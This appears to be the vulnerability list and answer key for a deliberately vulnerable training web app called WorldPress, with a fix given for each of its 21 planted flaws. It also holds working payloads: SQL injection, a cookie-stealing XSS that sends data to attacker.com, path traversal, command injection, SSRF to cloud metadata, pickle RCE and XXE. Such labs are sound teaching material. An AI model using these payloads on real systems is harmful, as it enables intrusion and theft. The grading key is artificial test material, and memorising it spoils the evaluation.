# WorldPress — Vulnerability List (For Learning Only)

> This project is for web security learning. The following vulnerabilities are intentionally embedded in the code.
> **Do NOT use in any production environment or test against targets without explicit authorization.**

---

## Overview (21 in total, across 6 paths)

| # | Vulnerability Type | Path / Endpoint | Code Location |
|---|----------|------------|---------|
| 1 | SQL Injection (Login) | `POST /api/auth/login` | `routes/auth.py` |
| 2 | Open Redirect | `POST /api/auth/login?redirect=` | `routes/auth.py` |
| 3 | No Rate Limiting (Brute Force) | `POST /api/auth/login` | `routes/auth.py` |
| 4 | Weak JWT Secret | All authenticated endpoints | `config.py`, `routes/auth.py` |
| 5 | IDOR (Unauthorized User Read) | `GET /api/users/{id}` | `routes/users.py` |
| 6 | Mass Assignment (Privilege Escalation) | `PUT /api/users/{id}` | `routes/users.py` |
| 7 | Sensitive Data Exposure (Password Hash) | `GET /api/users` / `GET /api/users/{id}` | `routes/users.py` |
| 8 | SQL Injection (Search) | `GET /api/posts?search=` | `routes/posts.py` |
| 9 | Stored XSS (Post Content) | `POST /api/posts` / `PUT /api/posts/{id}` | `routes/posts.py` |
| 10 | IDOR (Unauthorized Post Edit/Delete) | `PUT /DELETE /api/posts/{id}` | `routes/posts.py` |
| 11 | Path Traversal (Download) | `GET /api/media/download?file=` | `routes/media.py` |
| 11b | Path Traversal (Preview, Unauthenticated) | `GET /api/media/preview?path=` | `routes/media.py` |
| 12 | Unrestricted File Upload Type | `POST /api/media/upload` | `routes/media.py` |
| 13 | Command Injection | `POST /api/media/thumbnail` | `routes/media.py` |
| 14 | SSRF | `POST /api/settings/fetch-url` | `routes/settings.py` |
| 15 | Hardcoded Credential Leakage | `GET /api/settings` | `config.py`, `routes/settings.py` |
| 16 | Insecure Deserialization (Pickle) | `POST /api/settings/import` | `routes/settings.py` |
| 17 | XXE (XML External Entity) | `POST /api/settings/import-xml` | `routes/settings.py` |
| 18 | Information Disclosure (Full Stack Trace) | All exceptions | `app.py` |
| 19 | Authorization Bypass (Header Injection) | Admin endpoints like `/api/users`, `/api/settings` | `routes/users.py`, `routes/settings.py` |
| 20 | Stored XSS (Comments) | `POST /api/posts/{id}/comments` | `routes/posts.py` |
| 21 | Reflected XSS (Comment Author) | `POST /api/posts/{id}/comments` (error response) | `routes/posts.py` |

---

## Ideal Deliveries

Ideal deliveries define the preferred *review shape* of the answer key: **one ideal delivery should map to one self-contained PR**.
Each ideal delivery is a reviewer-oriented repair boundary that groups vulnerabilities only when doing so improves reviewability—because the fixes share a code path, trust boundary, authentication/session flow, rendering/sanitization strategy, or another cross-cutting control.
The goal is that each delivery can be reviewed, tested, and rolled back independently with minimal overlap.

| Ideal delivery | Answer-key items | Rationale |
|---|---|---|
| Login endpoint hardening | #1, #2, #3 | These issues share the login handler and authentication flow. A reviewer can assess query safety, brute-force resistance, and post-login redirect validation together. |
| JWT secret hardening | #4 | JWT signing is a separate trust anchor from the login handler implementation. Keeping it as a separate delivery makes the config change easy to review and roll back independently. |
| Admin authorization gate (remove header bypass) | #19 | Admin-only routes rely on a common `require_admin()` control. The header-based override is a single high-impact bypass and should be removed and reviewed as one authorization-boundary fix. |
| User data access and profile update controls | #5, #6, #7 | These issues share `routes/users.py` and the user object trust boundary: object-level authorization (IDOR), update-field allowlisting (mass assignment), and response serialization (do not expose password hashes). |
| Post query construction safety | #8 | Search uses dynamic SQL construction. This delivery focuses on parameterization and consistent query building without mixing in authorization or rendering changes. |
| Post ownership authorization | #10 | Edit/delete actions need object-level authorization checks. Keeping this separate reduces reviewer load and allows dedicated tests around ownership enforcement. |
| Content rendering and sanitization safety | #9, #20, #21 | Stored/reflected XSS issues share a common content-trust boundary. They should be addressed with one consistent sanitization/escaping strategy across post and comment surfaces. |
| Media file handling and OS interaction boundary | #11, #11b, #12, #13 | Download/preview path traversal, upload type restrictions, and thumbnail generation all connect user input to filesystem paths or OS-level execution; they should be reviewed together with one normalization, confinement, and safe process-exec strategy. |
| Settings fetch/import parser safety | #14, #15, #16, #17 | Outbound URL fetch (SSRF), configuration/credential exposure, and import parsing (pickle / XML) form a single settings-admin trust boundary and should be hardened together with allowlists and safe parsers. |
| Error handling and response minimization | #18 | Returning full stack traces is a distinct cross-cutting output control. Review it independently to ensure consistent error responses and server-side logging. |

These groupings are used to evaluate delivery alignment and reviewability. They do not replace the vulnerability list itself.

---

## Details and Exploitation Examples

### 1. SQL Injection — Login Bypass
**Endpoint:** `POST /api/auth/login`

The login query is built via string formatting/concatenation, so classic `' OR '1'='1` can bypass authentication.

```bash
curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "x"}'
```

**Fix:** Use parameterized queries, e.g. `cursor.execute("SELECT ... WHERE username=?", (username,))`.

---

### 2. Open Redirect
**Endpoint:** `POST /api/auth/login?redirect=https://evil.com`

After successful login, the `redirect` parameter is used directly without allowlist validation, enabling redirects to arbitrary external sites (phishing).

```
POST /api/auth/login?redirect=https://attacker.com
```

The frontend executes `window.location.href = data.redirect`, completing the redirect.

**Fix:** Require the redirect URL to start with `/` (relative path) or be within an allowlisted domain.

---

### 3. No Rate Limiting — Brute Force
**Endpoint:** `POST /api/auth/login`

The login endpoint has no rate limiting or account lockout, allowing unlimited password attempts.

```bash
for pw in password 123456 admin123 letmein; do
  curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pw\"}" | grep -v error
done
```

**Fix:** Add rate limiting (e.g. Flask-Limiter) and lock accounts after repeated failures.

---

### 4. Weak JWT Secret
**File:** `config.py` (secret: `wp_secret_2024`)

The secret is short and predictable, making it vulnerable to offline dictionary/brute-force attacks, enabling token forgery.

```python
import jwt, itertools
token = "<get from login response>"
# Use hashcat or jwt_tool for dictionary attacks
# hashcat -a 0 -m 16500 <token> wordlist.txt
```

**Fix:** Generate a strong secret (e.g. `secrets.token_hex(32)`) and load it from environment variables.

---

### 5. IDOR — Unauthorized User Read
**Endpoint:** `GET /api/users/2`

Any authenticated user (including a normal editor) can read any user's details, including password hashes.

```bash
curl http://localhost:5000/api/users/1 \
  -H "Authorization: Bearer <editor_token>"
```

**Fix:** Enforce `current_user["user_id"] == user_id` or require `role == "admin"`.

---

### 6. Mass Assignment — Privilege Escalation
**Endpoint:** `PUT /api/users/{id}`

The handler maps all JSON fields directly into an UPDATE statement, so an attacker can set their `role` to `admin`.

```bash
curl -X PUT http://localhost:5000/api/users/2 \
  -H "Authorization: Bearer <editor_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**Fix:** Use an allowlist of editable fields (e.g. `bio`, `email`); require admin privileges for role changes.

---

### 7. Sensitive Data Exposure — Password Hash Leakage
**Endpoints:** `GET /api/users`, `GET /api/users/{id}`

API responses include the `password` field (MD5 hash). MD5 hashes are often trivially crackable via rainbow tables.

```bash
# MD5(admin123) = 0192023a7bbd73250516f069df18b500
echo -n "admin123" | md5sum
```

**Fix:** Exclude `password` from responses; store passwords with bcrypt.

---

### 8. SQL Injection — Search
**Endpoint:** `GET /api/posts?search=`

The search parameter is concatenated into a LIKE query, enabling UNION-based injection to read arbitrary table data.

```bash
curl "http://localhost:5000/api/posts?search=%25' UNION SELECT id,username,password,email,role,NULL,NULL,NULL,NULL,NULL,NULL FROM users--"
```

**Fix:** Use parameterized queries (`LIKE ?`) and pass `f\"%{search}%\"`.

---

### 9. Stored XSS — Post Content
**Endpoints:** `POST /api/posts` (frontend: `PostEdit.vue`)

Post content is stored as raw HTML, and the frontend renders it with `v-html`, so any viewer executes injected scripts.

```json
{
  "title": "XSS Test",
  "content": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
}
```

**Fix:** Sanitize HTML server-side (e.g. bleach); render as text on the frontend instead of `v-html`.

---

### 10. IDOR — Unauthorized Post Edit/Delete
**Endpoints:** `PUT /api/posts/{id}`, `DELETE /api/posts/{id}`

Any authenticated user can modify/delete other users' posts because ownership is not enforced server-side.

```bash
# An editor deletes an admin's post
curl -X DELETE http://localhost:5000/api/posts/1 \
  -H "Authorization: Bearer <editor_token>"
```

**Fix:** Validate `post.author_id == current_user.user_id` or require `role == "admin"`.

---

### 11. Path Traversal — File Download
**Endpoint:** `GET /api/media/download?file=../../config.py`

The `file` parameter is joined with the uploads directory without canonicalization checks, enabling reads of arbitrary server files.

```bash
curl "http://localhost:5000/api/media/download?file=../../config.py" \
  -H "Authorization: Bearer <token>" -o stolen_config.py
```

**Fix:**
```python
real = os.path.realpath(file_path)
if not real.startswith(os.path.realpath(UPLOAD_FOLDER)):
    abort(403)
```

---

### 11b. Path Traversal — Unauthenticated Preview
**Endpoint:** `GET /api/media/preview?path=../../backend/config.py`

The `/preview` endpoint requires no authentication and has the same traversal issue, so the attack surface is larger.

---

### 12. Unrestricted File Upload Type
**Endpoint:** `POST /api/media/upload`

Only `secure_filename` is used to mitigate traversal; file extensions/MIME types are not validated, so executable files like `.py`/`.sh` can be uploaded.

**Fix:** Validate an allowlist of extensions, e.g. `ALLOWED_EXTENSIONS = {'png','jpg','gif','pdf'}`.

---

### 13. Command Injection
**Endpoint:** `POST /api/media/thumbnail`

The `filename` and `size` parameters are concatenated into a shell command, enabling arbitrary command execution.

```json
{"filename": "a.jpg; id > /tmp/pwned.txt #", "size": "150x150"}
```

**Fix:** Use `subprocess.run([...], shell=False)` with an argument list instead of `shell=True` strings.

---

### 14. SSRF
**Endpoint:** `POST /api/settings/fetch-url`

The server proxies arbitrary URLs, enabling internal network probing and cloud instance metadata access.

```json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

```json
{"url": "http://127.0.0.1:5000/api/users"}
```

**Fix:** Resolve and validate the destination IP is not in private ranges; use a URL allowlist.

---

### 15. Hardcoded Credential Leakage
**File:** `config.py`, **Endpoint:** `GET /api/settings`

Default credentials `admin/admin123` are hardcoded, and when an admin calls `/api/settings` they are returned in cleartext in the response body.

**Fix:** Provide credentials via environment variables; never return credential fields in responses.

---

### 16. Insecure Deserialization (Pickle RCE)
**Endpoint:** `POST /api/settings/import`

The endpoint base64-decodes input and calls `pickle.loads()` directly, enabling remote code execution.

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/rce.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send the payload to /api/settings/import
```

**Fix:** Disallow pickle; use JSON and validate against a schema.

---

### 17. XXE (XML External Entity)
**Endpoint:** `POST /api/settings/import-xml`

lxml can resolve external entities by default; malicious XML can be crafted to read local files.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<settings>
  <setting><key>test</key><value>&xxe;</value></setting>
</settings>
```

**Fix:** `etree.fromstring(xml, parser=etree.XMLParser(resolve_entities=False))`

---

### 18. Information Disclosure — Full Stack Trace
**File:** `app.py`

A global error handler returns full Python stack traces (including file paths, line numbers, variable names) to clients.

**Fix:** Return only generic error messages in production; log details server-side.

---

### 19. Authorization Bypass — Header Injection
**Endpoints:** All admin endpoints (e.g. `/api/users`, `/api/settings`)

If the request includes the `X-Admin-Override: true` header, `require_admin()` returns True and bypasses role checks.

```bash
curl http://localhost:5000/api/users \
  -H "Authorization: Bearer <editor_token>" \
  -H "X-Admin-Override: true"
```

**Fix:** Remove the header-based bypass; authorize only based on the JWT role claim.

---

### 20. Stored XSS — Comment Content
**Endpoint:** `POST /api/posts/{id}/comments`

Comment content is also stored as raw HTML and rendered via `v-html`, impacting all visitors who view the post.

---

### 21. Reflected XSS — Comment Author
**Endpoint:** `POST /api/posts/{id}/comments` (error response)

When `content` is empty, the `author` field is inserted directly into an HTML response with `text/html`. If a browser renders it, XSS triggers.

```bash
curl -X POST "http://localhost:5000/api/posts/1/comments" \
  -H "Content-Type: application/json" \
  -d '{"author": "<img src=x onerror=alert(1)>", "content": ""}'
```

---

## Tech Stack and Quick Start

```bash
./start.sh
# Frontend: http://localhost:3000
# Backend: http://localhost:5000
# Account: admin / admin123
```
